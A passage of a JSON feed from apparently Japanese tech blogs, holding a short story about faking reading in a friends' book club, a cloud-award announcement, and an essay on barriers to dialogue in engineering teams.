Endpoint","link":"https://speakerdeck.com/masasuzu/2025-11-21-she-nei-enziniamian-qiang-hui-gai-meteli-jie-suruvpc-endpoint","contentSnippet":"社内勉強会で発表したVPC Endpointの説明資料","isoDate":"2025-11-21T05:00:00.000Z","dateMiliSeconds":1763701200000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"たぶん、読んでない","link":"https://syu-m-5151.hatenablog.com/entry/2025/11/21/100503","contentSnippet":"１　「ねえ、今年、何冊読んだ？」　秋だか冬だかよくわからない曖昧な気温の日の帰り道、奈々子が突然そう聞いてきた。駅までの道はいつも通り混んでなくて、コンビニの前にだけ人が固まって、誰もがスマホを見ていた。私もその一人だった。「え？」「本。本。読書」「……えーと」　指の動きが止まる。さっきまでタイムラインで「＃今月の読了本」とか「＃社会人の学び直し」とかを眺めていたのを、慌ててLINEに切り替える。画面を隠すみたいにスマホを持ち替えてから、私はうーんと声だけ伸ばした。「十冊くらい？」　とりあえず無難そうな数字を出してみる。百と言うほどの勇気も、ゼロと言うほどの正直さもない。「うわ、すご。ちゃんとしてるじゃん」　奈々子は素直に感心して、コンビニのビニール袋をぶらぶら揺らした。中身はたぶん夕ご飯兼夜食。糖質と油でできた「がんばる社会人の味方」みたいなやつ。「直近で読んだ本、なに？」　その追撃は予想してなかった。「え、直近？」「うん。最後に読み終わったやつ」　最後に読み終わった本。　――最後に読み終わった本。　頭の中の本棚を、一応探す。けどそこでまずひっかかるのは「読み終わった」という条件だった。読みかけのまま机に積んだ本なら、タイトルは山のように浮かぶ。「入門なんとか」「ゼロから学ぶなんとか」「要点でわかるなんとか」。でも「最後まで読んだ」と言い切れるやつは、思い出そうとした瞬間、全部グレーアウトする。「……あれ」「なにその“あれ”？　バグ起きてる？」「最後に読み終わった本、いつだっけって……」「こわ。バックアップとってないの？」　奈々子のそういう言い方はいつも冗談っぽくて、でもちょっとだけ刺さる。私は笑ったふりをして、苦い唾を飲み込む。「てかさ」　奈々子が続ける。「うちの会社、来月からなんか“リスキリング読書チャレンジ”っての始まるんだよね。部署ごとに月一冊ビジネス書読んで、感想共有しましょう、みたいな。で、個人でも“今月の一冊”みたいなのやるらしくてさ」「へえ」「でね。せっかくだから、私たちもやろうかなって思って」「私たち？」「ほら、サークルメンバー。社会人になってから、全然会わなくなっちゃったじゃん？　“オンライン読書会”とかやればさ、月一くらいで話すきっかけにもなるかなって」　ああ、そういう流れか、と理解する前に、奈々子はもうスマホを取り出していた。私の視界に、彼女の親指がスタンプを送るような速さでグループ名を打ち込んでいるのが見える。「グループ名なにがいいかな。“読書会”だとダサいよね。“本を読む会”はもっとダサいし」「その辺の差は誤差じゃない？」「“＃積読解消戦線”とか？」「長い」「じゃあ“積読クラブ”とか」　その単語に、私は少しだけ心臓を掴まれた気がした。「よくない？　積読って正直だし。でも“クラブ”ってつけると急に救われる感じしない？　あ、今の、私けっこう名言じゃない？」「自画自賛するな」　笑いながら、私は「積読クラブ」の五文字を頭の中で反芻した。　積読クラブ。　積んだまま、読まない本たち。　その周りに集まる、積んだまま、読まない人たち。　グループは五分後にはできていた。元サークル仲間の名前が次々と追加されていく。就職して地方に散った人たち。営業職。エンジニア。保育士。フリーター。誰もが、プロフィール欄にそれぞれの「がんばってる私」っぽい一言を添えていた。「＃新卒一年目」「＃営業修行中」「コーヒーと本があれば生きていけます」みたいなやつ。　私は自分のプロフィール欄を見て、ため息をついた。「読書と映画と猫が好きです。」　猫は好きだ。映画も好きだ。読書は――好きになりたい、の方が正確かもしれない。２　グループのルールは意外とちゃんとしていた。　一、月に一冊は「自腹で」本を買うこと　二、「今月の一冊」を写真付きでグループに投稿すること　三、月末にはオンラインで一時間だけ感想を話すこと　四、ネタバレは基本あり。ただし他人の「まだ途中」を尊重すること　奈々子が会社の企画を真似して、少し柔らかくしたらしい。ルールが投稿された数秒後には、「いいね」「賛成」「最高」みたいなスタンプが飛び交った。画面の中の絵文字たちは、私よりずっと素直で健康そうだった。　問題は、一だ。　「自腹で」本を買うこと。　それなら余裕だ。　問題は、二と三だ。　「今月の一冊」を写真付きで投稿し、「感想を話す」こと。　私はすでに、自腹で買って読んでない本を、床の上に二十冊くらい積んでいる。　最初の週末、私はその本の塔の前に正座していた。積まれた背表紙たちが、集合写真みたいにこちらを見ている。「入門○○」「ゼロからわかる\xd7\xd7」「二十代で身につけたいなんとか」。購入当時の私は、どれも必要だと思っていた。今の私は、どれから逃げるかを考えている。「買わないでも、これのどれかに“今月の一冊”ってタグつければよくない？」　自分に言ってみる。でもそれは、何かを誤魔化すための言い訳にしか聞こえない。そもそもこの「積読クラブ」、積読を増やすために始めたんじゃない。減らすために、だったはずだ。　とりあえず、私は一番上の一冊を手に取る。帯には「今、若手社会人が読むべき一冊！」と書いてあった。誰が決めたのか知らない「今」と「べき」。表紙には、スーツ姿の誰かが笑っているイラスト。笑顔がまぶしい。帯を外し、ページをぱらぱらとめくる。文字が詰まっている。「はじめに」の最初の段落を読む前に、私はスマホを取り出した。「○○　要約」と打ちながら、ため息をつく。　検索結果には、ブログ記事や要約動画がずらっと並んでいた。「３分でわかる」「１０分で理解」「この本のポイントは３つだけ」。そこに並ぶタイトルたちを見ていると、「本を読む」という行為そのものが、もう既に誰かの仕事によって要約済みなんじゃないかって気がしてくる。　私は一番上のブログを開いた。　「この本で著者が伝えたいことは、大きく分けて３つあります。」　その一文を見た瞬間、私はすでに、達成感の影を感じていた。　――あ、わかった気がする。　ブログを最後まで流し読みし、そのまとめを自分の頭の中でさらにまとめてみる。「変化の時代には主体的なキャリア形成が」「行動こそ最大の学び」「失敗を恐れず挑戦を」。どこかで聞いたことのある言葉たちが、どこかからコピペされたみたいに整列していく。私は本を開きもせずに、その本について「語れる気」になり始めていた。　カメラアプリを起動する。表紙をきれいに撮るため、部屋の中で一番明るい場所を探して本を持ち歩く。窓際、机の上、ベッドの上。一番映えそうな角度を探して、何枚か撮る。フィルターをかける。明るさを調整する。「それっぽい」写真ができたところで、私はグループに投稿した。「今月の一冊はこれにしました！」　文末に本の簡単な紹介と、「今の自分にはこれが必要だと思ったので」という一文を添えて送信する。送信ボタンを押した瞬間、スマホが震えたような気がした。実際には震えてない。ただ私の心臓が、勝手に震えただけだ。　数秒後、「おおー！」「それ気になってた！」「感想聞きたい！」とスタンプが返ってくる。画面には、色とりどりの絵文字と既読マーク。「ちゃんとしてる私」を、数秒で証明できてしまったみたいで、少し怖かった。　机の上では、さっき撮影に使った本が、まだ「はじめに」のページすら開かれていないまま、静かに置かれていた。３　月末のオンライン読書会は、想像以上にカオスだった。「じゃあ、今月の一冊、順番に話してこっかー」　奈々子が司会を買って出て、画面に並んだ六つの顔を順番に指名していく。ZOOMの小さな四角の中で、それぞれの生活感が垣間見える。洗濯物が干されたままの部屋。オフィスっぽい背景。カーテンだけが映っている画面。バーチャル背景で海になっているやつ。「じゃあまずは、りおから」　名前を呼ばれて、一瞬だけ返事を忘れる。慌ててマイクをオンにした。「あ、はい」「何読んだんだっけ？」「えっと……これ」　先週、タイムラインに流れてきた感想ツイートを３つくらいスクショして、ノートアプリに箇条書きしたやつが、スマホの裏側で控えている。本体より、そっちの方を信頼している自分が情けない。「えーとね、“自分のキャリアは自分で選べ”みたいな話で……」　自分で選べ。　自分で選べ。　自分で選んだ結果、私は今、要約ブログだけを読んでしゃべっている。　私が拙い言葉で本の内容をなぞる間、画面の中の友人たちは、うんうんと頷いたり、「わかるー」と相づちを打ったりしてくれる。その優しさが、逆に拷問みたいに感じる。「で、特に印象に残ったのが、“行動しないと何も変わらない”っていうところで……」　自分で言って、自分で刺さる。　行動しないと、何も変わらない。　でも私は、本すら開いていない。「りお、なんか変わった？　これ読んで」　奈々子がライトに聞いてくる。彼女に悪気がないのはわかってる。でも、だからこそ、逃げ場がない。「えっと……」　一瞬、本気でZOOMを落としてやろうかと思った。回線不良になったふりをして、消えてしまう。けど、それをやったら、たぶんこのグループからも、本当に消えてしまう気がした。「“変わった”っていうか……なんか、今のままだとやばいかもって思った、かな」　それは嘘ではなかった。ブログを読んで、本を読んだ気になって、それでもどこかで罪悪感を抱えている自分を「やばい」と思っているのは、本当だ。「おー、いいじゃん。危機感、大事」　奈々子が笑って、他のメンバーもうんうん頷く。「てかさ、正直言うと……」　別の四角から、慎ましい声がした。「ちゃんと最後まで読めたの、今月、一冊もないんだよね」　話しているのは、健太だった。サークル時代、いつも端っこで本を読んでた、よく意味のわからない人。卒業してからも、読書メーターみたいなアプリのスクショをよくタイムラインに上げていたから、「あいつはずっと本を読んでる人」だと、勝手に思い込んでいた。「え、そうなの？」「うん。三冊買ったんだけど、どれも途中で飽きてさ。仕事忙しいのもあるけど、なんか……集中できないんだよね。本開いても、三ページくらいでスマホ見ちゃう」　その言葉に、私は勝手にドキッとした。　三ページでスマホ。それは、まさに私のことだった。「でもさ、健太、読書メーターめちゃ更新してるじゃん」　誰かがツッコむ。健太は「あー」と曖昧に笑った。「あれも、正直、ちょっと“盛ってる”」「盛ってる？」「途中までしか読んでない本も、“読了”にしちゃってる。なんかさ、“途中まで読んで放置した本”って、アプリ上でも現実でも、すごい罪悪感あるじゃん。だから、読み切ってなくても、“だいたいわかったからいいや”みたいな感じで、読了にしちゃう。自己満だけど」　画面越しに沈黙が落ちた。その沈黙には、「わかる」と「怖い」と「笑える」と「笑えない」が全部混ざっていた。「ていうかさ」　奈々子が笑いながら言う。「こういう場で“わかる”って言える時点で、もうけっこう重症だよね、私たち」　笑いが広がる。私も笑う。けどその笑いの中で、心のどこかが冷えていく。　――ああ、みんなも同じなんだ。　そう思うと、安心するはずなのに。「じゃあさ」　奈々子が、急に真面目な声になった。「この中に、“ちゃんと読んだ人”、いる？」　一瞬、画面が固まったように見えた。誰も喋らない。誰も名乗り出ない。　そのとき、画面の隅っこで、誰かのアイコンが小さく光った。ミュート解除のマークがつく。私、そこに誰がいたか、正直すぐには思い出せなかった。グループに追加されてたのは知ってたけど、この一ヶ月、ほとんど発言してない人だ。「……一冊だけ、読んだ」　画面の中央に、その人の顔が映し出される。メガネ。無造作な前髪。背景には、本棚。背表紙の色合いからして、ビジネス書じゃなさそうだった。「あれ、みゆき？」　奈々子が目を丸くする。「え、みゆき、いたの？」「いたよ。最初から」　みゆき。大学時代、同じサークルにいたけど、ほとんど話したことがない。いつもイベントの受付をしていて、写真に写るときは端っこにいた。存在感が薄い、というより、空気と同じくらい自然にそこにいる人。「なに読んだの？」　奈々子が聞く。みゆきはちょっと迷ってから、画面から消えた。数秒後、本を一冊持って戻ってくる。「これ」　画面いっぱいに映し出されたのは、聞いたことのない小説のタイトルだった。帯には、どこかの文学賞のロゴ。売り場で平積みになっているイメージが、あまり湧かない。「なんか、意外」「うん。仕事で疲れるからさ、ビジネス書とか、読む気にならなくて。とりあえず、“今読みたいもの読もう”って思って」　その「今読みたいもの」という言葉が、やけにまっすぐに聞こえた。「どうだった？」「うーん……」　みゆきは少し考えてから、言葉を探すみたいに話し始めた。「最初、全然、意味わかんなかった。登場人物が何考えてるのかもよくわかんないし、文章もなんかへんな感じで。でも、読み進めてるうちに、“意味わからないけど、なんかこの感じ、わかるかも”ってところが増えてきて……なんていうか、“答えがないまま終わる話”なんだけど、その“答えのなさ”が、読んでてすごい落ち着いた」　画面の誰かが、「へえ」と感心する。私は、自分の指先が汗ばんでいることに気づいた。「なんかさ」　みゆきは、言葉を足す。「仕事で、毎日、“正解に近づく”ことばっかりやってる気がして。“より正しい資料”“よりわかりやすい説明”“より納得してもらえる提案”。そういうのを目指すのは嫌いじゃないんだけど……なんか、“どこにも着地しない話”を読んでると、“着地しなくてもいい時間”がちゃんとあるの、ありがたいなって思った」　誰かが「わかるかも」とぼそっと呟く。「でね」　みゆきは、小さな声で続ける。「この本読んだこと、別に誰にも言うつもりなかったんだよね。本棚にしまって、終わりでいいかなって。でもこのグループあるから、“一応、報告しとこっか”って思って」　奈々子が笑う。「うちらの積読クラブ、効いてるじゃん」「でもさ」　みゆきは、少しだけ目線を落とした。「なんか、“本を読んだことを報告するために読む”ようになったら嫌だなって、ちょっと思った」　その言葉が、静かに画面全体に降りた。「だから今月は、この一冊だけでいいやって思った。『今月の一冊』っていうより、『今のわたしの一冊』の方が、しっくりくるから」　誰もすぐには何も言わなかった。奈々子ですら、一瞬、言葉を失っているように見えた。　グループの名前は「積読クラブ」だけど、今この瞬間、私たちの前にそびえ立っているのは、本の山じゃなくて、会話の沈黙だった。その沈黙の高さを測りながら、私は、自分の机の上の、開かれていないビジネス書のことを思い出していた。４　読書会が終わってから、しばらくの間、グループチャットは静かだった。いつもなら「おつかれー」「今日も楽しかった！」みたいな軽いメッセージが飛び交うのに、その日はスタンプ一個だけで終わった。　私はノートパソコンを閉じ、部屋の電気を消した。暗くなってから、机の上の本を手探りで見つける。さっきまで「読んだふり」をするための道具だったそれが、急に、すごく重く感じた。　窓の外には、向かいのマンションの灯りがぽつぽつとついていた。どの部屋にも、それぞれの生活があって、それぞれの「今月の一冊」だか「今週のタスク」だか「今日の後悔」だかがあるんだろう。　私はベッドに腰掛け、本を膝の上に置いた。　――今のわたしの一冊。　みゆきの言葉が、何度もリピートされる。　今のわたし。　今のわたし、ってなんだろう。　タイムラインを開けば、誰かの「今」は洪水みたいに流れてくる。今読んだ本。今感じたこと。今考えていること。今、頑張っている自分。今、落ち込んでいる自分。今、立ち直っている自分。誰もが「今」を差し出し合い、その中に正解を探している。　でも、私の「今」は、うまく言語化できない。　ただ、疲れていて、焦っていて、何かにならなきゃいけない気がして、何にもなれていない。　私は本を開いた。　「はじめに」の一行目を読む。　さっき、要約ブログで読んだ内容と、ほとんど同じことが書いてある。でも、紙に印刷されている文字と、スマホのスクロールで流れていく文字は、同じ意味のはずなのに、体感が違う。　二行目を読む。　三行目を読む。　十行目あたりで、スマホに手が伸びそうになる。　「本　要約」「この本　感想」「この本　評判」。　そのどれかを検索すれば、「自分の考え」の代わりになる言葉が、いくらでも手に入る。　でも、今日はとりあえず、それをしないことにしてみる。　ページをめくる。　文字を追う。　頭に入っているのかどうか、自分でもよくわからない。著者の例え話が、いちいち大げさで、鼻につく。自分とは違う世界の人が、違う世界の成功体験を、私に一方的に教えようとしてくる。　途中で、「なんでこれ選んだんだっけ」と思う。　「今の自分にはこれが必要だと思ったので」。　投稿文に書いたあの一文が、じわじわと恥ずかしくなってくる。　そのとき、ふと気づく。　――誰にも見せない読書って、めちゃくちゃ、不安定だ。　カメラロールには、読書中の私の写真はない。　タイムラインにも、読書ログは流れない。　アプリの「読了数」も、増えない。　私がこの本を読んだことを知っているのは、たぶん、今日の私だけだ。明日の私はもう忘れているかもしれないし、来週の私は別のことに追われているかもしれない。この時間は、どこにも記録されないまま、沈んでいく。　その感じが、なぜか、少しだけ、心地よかった。　ページをめくる速度は、遅い。　時々、同じ行を二度読む。　わからない言葉は、そのまま放置する。　大事そうなところに、線を引こうとして、ペンを取りに立ち上がるのがめんどうで、やめる。　「読書」と呼ぶには、あまりにもだらしない。　「学び」と呼ぶには、あまりにも生産性が低い。　それでも、本は、そこにある。　ここで、私とだけ、つながっている。5　その夜、私は本棚の前に立った。　積まれた背表紙の山。　その中から、一冊を適当に引き抜く。　ビジネス書でも、自己啓発書でも、小説でもない、よくわからないエッセイ集だった。たぶん、前にどこかの書店で、「人気芸人が勧める３冊」みたいなポップを見て、勢いで買ったやつだ。　表紙のデザインも、著者の名前も、今まで何度も目にしているはずなのに、「初めてちゃんと見る」感じがした。　ページを開く。　一行目を読む。　面白いかどうかは、まだわからない。　ためになるかどうかも、まったく不明。　この本を読み終わったところで、給料が上がるわけでもないし、フォロワーが増えるわけでもない。　でも、今、ここにある「わからなさ」は、たぶん、誰かのブログでは代替できない。　誰かの要約では、コピーできない。　部屋の中は静かだった。　スマホは、ベッドの向こう側で、画面を下にして置いてある。通知が鳴っても、すぐには気づかない場所。　一ページ。　二ページ。　三ページ。　ちょっとだけ、スマホのことを思い出す。　でも今日は、とりあえず、手を伸ばさない。　四ページ。　五ページ。　どこまで読んだら「読書」と呼べるのかなんて、誰も決めていない。　どこまで理解したら「学び」になるのかなんて、誰も教えてくれない。　きっと私は、これからも、本を読んでるふりをする。　読んでないのに「読んだ」と言いたくなる夜も、またあるだろう。　積読の山は、これからも増えるかもしれない。　それでも、ときどき、こうして誰にも見せない読書をする。　誰にも報告しないまま、本を開いて、閉じる。　「今のわたしの一冊」は、きっと、そのたびに変わる。　変わらないまま終わる夜もある。　それでいいのかどうかなんて、まだわからない。　でも、わからないままページをめくることくらいは、今の私にもできる。　ページの端をつまんで、ゆっくりとめくる。　新しい行が現れる。　そこには、誰かの言葉が並んでいた。　それを「理解」できたかどうかよりも先に、私はただ、その黒いインクの並びを、目で追い続けた。　たぶん、それも、読書のうちに入れていい。　そう勝手に決めて、私はもう一ページ、めくった。","isoDate":"2025-11-21T01:05:03.000Z","dateMiliSeconds":1763687103000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"スリーシェイク、5名のエンジニアがGoogle Cloud Partner Top Engineer 2026 を受賞","link":"https://sreake.com/blog/partnertopengineer2026/","contentSnippet":"この度 「Google Cloud Partner Top Engineer」アワードプログラムにおきまして、スリーシェイクのエンジニア5名が Google Cloud Japan が高い技術力を持ったエンジニアを表彰するプログラムである 「 Google Cloud Partner Top Engineer 2026 」に選出されたことをお知らせします。The post スリーシェイク、5名のエンジニアがGoogle Cloud Partner Top Engineer 2026 を受賞 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-11-21T01:00:00.000Z","dateMiliSeconds":1763686800000,"authorName":"Sreake","authorId":"Sreake"},{"title":"おい、対話しろ","link":"https://syu-m-5151.hatenablog.com/entry/2025/11/19/194809","contentSnippet":"はじめに会議室の空気が、徐々に重くなっていくのを感じました。「この設計、拡張性に問題があります」。若手エンジニアのAが言いました。声には確信がありました。「いや、今の要件を考えれば、これが最適だよ」。ベテランのBが即座に返します。口調は穏やかですが、譲る気配はありません。「でも、将来的に機能追加があったときに...」「将来のことばかり考えていたら、今のリリースが間に合わない」二人の言葉は交差しますが、交わりません。言葉のキャッチボールに見えて、実は2つのボールが空中でぶつかり合っているだけです。ボールは地面に落ち、誰も拾いません。私は黙って二人を見ていました。どちらの言い分も分かります。Aは技術的負債を恐れています。Bは納期のプレッシャーを感じています。どちらも正しく、どちらも間違っていません。何かが決定的に欠けています。対話が、ありません。二人は話しています。言葉を交わしています。しかし、対話していません。Aは自分の主張を繰り返し、Bも自分の主張を繰り返します。互いに相手の言葉を聞いているようで、実は聞いていません。正確に言えば、相手の言葉を「自分の理解の枠」に無理やり押し込んで解釈しています。会議は平行線のまま終わりました。結論は「後で話し合いましょう」。何も決まりませんでした。廊下を歩きながら、私は考えていました。なぜ私たちは、こんなにも対話ができないのか。技術の話をしているはずなのに、なぜ感情的な対立になるのか。対話は、なぜこんなにも難しいのか。この問いについて、私は何年も考え続けてきました。ある結論に到達しました。私たちは「対話」を誤解しています。対話とは何か、対話を阻むものは何か、対話を可能にするものは何か。これらをまったく理解していません。だから、対話という言葉を知っていても、対話ができません。対話の欠如は、組織を蝕みます。意思決定が遅れます。同じ議論を繰り返します。優秀な人材が疲弊して去っていきます。イノベーションが生まれません。答えはシンプルです。対話していないからです。このブログで、私は対話を語ります。しかし、「傾聴しましょう」「共感しましょう」という話ではありません。対話を阻む認識の構造を語ります。人間がどのように世界を見ているか、なぜ理解し合えないのか、どうすれば対話が可能になるのか。これらを、できる限り深く考えます。対話の前提を理解しなければ、対話は始まりません。まず、私たちは対話を阻んでいるものの正体を知らなければならないからです。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。対話という幻想を解体する「対話が大切です」。誰もが知っています。でも、「対話とは何か」をちゃんと説明できる人は、ほとんどいません。多くの人は、対話を情報のやり取りだと思っています。私が言葉を発します。相手が受け取ります。相手が言葉を返します。私が受け取ります。このキャッチボールが、対話だと。しかし、それはおそらく誤解です。対話は、データ転送ではありません。対話とは相互の世界観を認識して、理解を深めるプロセスです。その過程で認識の変容が起きることもあれば、相違を明確に理解した上で立場を維持することもあります。どちらも対話の成果です。あなたがコードレビューで「この実装は複雑すぎます」と言います。相手は「いや、これは必要な複雑性です」と返します。ここで何が起きているでしょうか。表面的には、意見の交換に見えます。でも、実際に起きているのは、もっと深い層での衝突です。あなたが「複雑」と言うとき、あなたは過去に経験した「複雑なコードがメンテナンス不能になった」記憶を参照しています。あなたにとって「複雑さ」とは、未来の技術的負債の予兆です。一方、相手が「必要な複雑性」と言うとき、相手は「ビジネス要件の複雑さを適切にモデル化した結果」を見ています。相手にとって「複雑さ」とは、現実を正確に反映している証拠です。同じ「複雑」という言葉を使っていますが、指し示すものがまったく違います。この認識の差異に、どちらも気づいていません。対話が成立するためには、この差異に気づかなければならない。「ああ、私たちは同じ言葉を使っているが、違うものを見ているのです」と。この気づきがないまま言葉を交わし続けても、それは対話ではありません。ただの言葉の衝突です。そして、多くの人は対話の目的を誤解しています。対話の目的は、合意することだと思っています。それは副産物に過ぎません。対話の本質は、相互の世界観を認識することです。あなたの目に世界がどう映っているか。相手の目に世界がどう映っているか。この2つの視点を、互いに理解し合うこと。それが対話です。合意なき理解。これは矛盾しているように聞こえます。しかし考えてほしい。あなたは親友と、政治的な意見の相違があります。それでも友人関係は続きます。なぜか。互いの違いを理解しているからです。「あの人はこういう経験をしてきたから、こう考えるのです」。この理解があれば、意見の相違は関係を壊しません。むしろ、理解の深さが関係を強くします。対話をスキルだと考える人も多いです。傾聴のテクニック。共感の言葉。これらを学べば、対話ができると。しかし、テクニックだけではどうしても不十分です。対話は、技術である前に、存在の様式です。「どう在るか」の問題です。防御的な存在様式のまま、いくら傾聴のテクニックを使っても、それは対話になりません。対話とは、自分の腹の中を晒す行為です。「私は確信を持っていない」と認めることです。「私の見方は、1つの解釈に過ぎない」と受け入れることです。「相手の言葉によって、私の認識が変わるだろう」と覚悟することです。この覚悟なしに、対話は始まりません。だから、対話は難しいのです。自分が正しいと思いたい。自分の世界観を守りたい。私を含めて人は変化することを恐れます。これらの防衛本能が、対話を阻みます。対話するためには、まず自分の防衛を解除しなければならない。しかし、防衛を解除することは、無防備になることではありません。対話における強さとは、自分の視点や視座や観点を絶対化しないことです。複数の解釈を許容することです。不確実性の中でも思考し続けることです。対話を不可能にする構造対話が難しいのは、個人の能力の問題ではありません。人間の認識そのものに、対話を阻む構造が組み込まれているからだ。認識の構造的宿命あなたは今、この文章を読んでいますよね。でも、実は「読んでいる」のではありません。脳は、膨大な情報の中から一部を選択し、それを「意味」として構成しています。人間の認識は、選択的です。世界をあるがままに受け取ることはできません。必ず、フィルターを通す。このフィルターを、認知科学では「スキーマ」と呼ぶ。スキーマとは、過去の経験から構築された認識の枠組みです。スキーマは、生存に必要です。毎回ゼロから世界を理解していたら、判断が遅すぎて生き残れません。パターン認識によって、瞬時に判断します。これは、進化が私たちに与えた能力です。しかし、この能力には代償があります。私たちは、世界をあるがままに見ることができません。常に、認識というレンズを通して見ます。対話において、これは致命的な問題を引き起こすことがあります。相手の言葉を聞くとき、私たちは相手が言った言葉を聞いているのではありません。自分のスキーマによって解釈された言葉を聞いています。「この実装、ちょっと心配だな」。相手がこう言ったとき、あなたは何を聞くでしょうか。もしあなたが過去にこの相手から批判された記憶があるなら、「また批判されています」と聞きます。しかし、相手は単に「一緒に確認したい」と言っているだけだろう。バイアスを取り除く。これは、よく言われるアドバイスです。しかし、バイアスを完全に取り除くことは不可能です。 バイアスは、認識の副作用ではありません。認識そのものです。スキーマなしに世界を見ることはできません。できるのは、「自分がバイアスを通して見ています」という自覚だけです。この自覚があるとき、対話の質が変わります。相手の言葉を聞いて、即座に「これはこういう意味です」と決めつけません。「私はこう解釈したが、相手の本当の意図は違うだろう」と留保します。「どういう意味ですか」と確認します。この一手間が、誤解を防ぐことがあります。認識の構造的宿命を受け入れること。これは対話の第一歩です。「私は世界をありのままに見ていない」と認めること。「私の解釈は、1つの可能性に過ぎない」と理解すること。この謙虚さが、対話の基盤です。権力勾配という非対称性「最近、調子はどう」。上司がこう聞きます。あなたは「はい、順調です」と答えます。同じ質問を同僚が聞きます。あなたは「ちょっと行き詰まっている」と本音を言います。同じ言葉なのに、発する人が変わると、意味が変わります。これは、社交辞令の問題ではありません。権力の非対称性が、言語の意味を書き換えています。上司の「最近どう」は、音声学的には同僚の「最近どう」と同じです。しかし、意味論的にはまったく別の文です。上司の言葉には、評価の含意があります。あなたの答えは、業績の報告として受け取られる可能性があります。だから、あなたは防御的になります。これは、悪意の問題ではありません。上司が部下を評価しようとしているわけではありません。だが、位置関係が、言葉に意味を付与します。 発話者の意図とは無関係に。権力の非対称性は、対話を歪めます。上下関係のある場で「自由に意見を言ってください」と言われても、部下は自由に意見を言えません。なぜならその意見が評価に影響する可能性を意識するからだ。たとえ上司が「評価には関係ない」と保証しても、その保証自体が権力の行使です。この問題に対して、「フラットな関係を目指しましょう」というアプローチがあります。しかし、これは幻想です。形式を変えても、構造は変わりません。 給与を決める権限、人事評価をする権限、プロジェクトのアサインを決める権限。これらの権力は、言葉遣いを変えても消えません。むしろ、権力の存在を否認することで、問題は見えにくくなります。現実的なアプローチは、権力の非対称性を前提とすることです。「私とあなたには、権力の差がある」と認めること。その上で、「この制約の中で、どこまで対話を開くことができるか」と問うこと。1つの方法は、構造を明示することです。「私は上司として聞いているのではなく、エンジニアとして意見を聞きたい」と宣言します。「今日の議論は、人事評価には一切関係ない」と約束します。その約束を守る。一貫性のある行動によって、徐々に信頼が生まれます。もう1つは、リスクを先に取ることです。権力を持つ側が、先に自分の弱さを晒す。「私もこの技術については自信がない」と認めます。「あなたの方が詳しいので、教えてほしい」と頼る。権力者が弱さを見せることで、非対称性が少し和らぐ。さらに、組織への信頼が一定以上ある場合、匿名フィードバックの併用も有効です。たとえば、月次で匿名のエンゲージメントサーベイを実施します。そこで出た意見を全体会議で議論します。これにより、権力関係の影響を受けずに本音の課題が可視化され、対話の素材となります。ただし、組織自体への信頼がなければ、良質なフィードバックは集まりません。匿名フィードバックは、信頼の上に成り立つ仕組みです。しかし、これはすべて部分的な緩和に過ぎません。権力の非対称性は根深く、簡単には変わらない。それでも、それを自覚して、丁寧に扱うことはできます。対話は完璧にはなりません。権力勾配がある限り、完全に対等な対話は困難です。でも、不完全な対話でも、無対話よりはるかにましです。時間的ズレという錯誤「あなたはいつもそうです」。この言葉を聞いたことがあるでしょう。しかし、よく考えてほしい。「あなたはいつもそうです」と言うとき、あなたは何を見ているのか。目の前の現在の相手を見ているのでしょうか。それとも、記憶の中の過去の相手を見ているのか。後者です。私たちは、相手の過去の行動パターンを記憶しています。そのパターンを、今の相手に投影しています。「あなたはいつも約束を守らない」と言うとき、私たちは過去の2回、3回の出来事を思い出しています。それを「いつも」に拡大しています。しかし、今この瞬間の相手は、過去の相手ではありません。人は変わります。状況は変わります。昨日の相手と今日の相手は、厳密には別の存在です。でも、私たちは記憶の中の相手と対話しています。現在の相手の言葉を、過去のパターンに当てはめて解釈しています。これは、認識の効率化です。毎回相手を新しく理解するのは、コストが高い。だから、脳は過去の経験からパターンを作り、それを使って瞬時に判断します。ほとんどの場合、これは有効です。相手の性格や行動パターンは、そう簡単には変わりません。しかし、対話においては、この効率化が仇となります。相手が変化しようとしているとき、成長しようとしているとき、私たちは過去のレッテルを貼り続けます。「あの人はこういう人です」という決めつけが、相手の変化を見えなくします。「以前のあなたなら、こう言っただろうけど」という前置きは、実は相手を過去に縛りつけています。多くの場合、予言の自己成就が起きます。「どうせ変わっていないと思われているなら、変わる必要はない」と相手は感じます。時間的ズレを意識するとは、「相手は過去の相手ではありません」と認めることです。「今のあなたは、どう考えていますか」と問うことです。過去のパターンは参考にしつつ、決定的な判断材料にしないことです。これは、自分自身に対しても同じです。「私はこういう人間です」という自己認識は、実は過去の自分のパターンです。対話するとは、この時間的ズレを認識することです。相手と自分、両者とも常に変化しています。過去に縛られず、現在に向き合う。しかし、ここで残酷な真実に向き合わなければならない。人は何にでもなれるから、何にもなれません。 無限の可能性があるように見えて、実は時間は有限です。「いつかやろう」は、気づいた時には「もうできません」に変わっています。時間は不可逆です。我々は有限の存在です。だからこそ、今この瞬間の対話が重要になります。先延ばしにした対話は、永遠に失われる可能性があります。ここまで見てきた3つの制約――認識の不可避性、関係性の非対称性、時間性の逆説――は、いわば人間という存在の「ハードウェアの制約」です。私たちは世界をそのまま受け取れないし、権力関係から自由でもないし、時間の外にも出られない。では、この制約の上で、私たちはどうやって対話を可能にしていけばいいのでしょうか。制約を完全に消すことはできません。しかし、制約を認識し、それを前提としながら、対話を開く力を育てることはできます。だからこそ、「制約付きの人間」がどんな力を鍛えれば対話が成り立つのかを、具体的に見ていく必要があります。ここからは、対話を可能にする3つの具体的な力を見ていきます。対話を可能にする力ここまで、対話を阻む構造的な問題を見てきました。認識の限界、権力の非対称性、時間の錯誤。これは、私たちの認識そのものに組み込まれた、避けがたい制約です。しかし、これらの制約を認識することが、対話への第一歩です。制約を知ることで、私たちは対話を可能にする力を育てることができます。対話は、単なる技術ではありません。同時に、訓練可能な能力でもあります。以下の3つの力は、対話を可能にする中核的な能力です。中断する力朝、目覚ましが鳴る。あなたは無意識にスマホを取ります。これらの行動は、意識的な判断を経ていない。自動的に起きています。人間の判断の大部分は、自動的に処理されています。私はこれを、2つのシステムとして理解しています。システム1は、速く、自動的で、直感的。システム2は、遅く、意識的で、論理的。システム1は、エネルギー効率が良い。過去の経験からパターンを学習し、瞬時に判断します。もしすべての判断をシステム2で処理したら、私たちは何もできません。しかし、システム1には限界があります。新しい状況に対応できません。複雑な判断ができません。バイアスに支配されます。対話は、システム1では処理できません。誰かがあなたを批判します。システム1は、瞬時に「攻撃です」と判断します。防御反応が起動します。反論します。言い訳します。相手を攻撃し返します。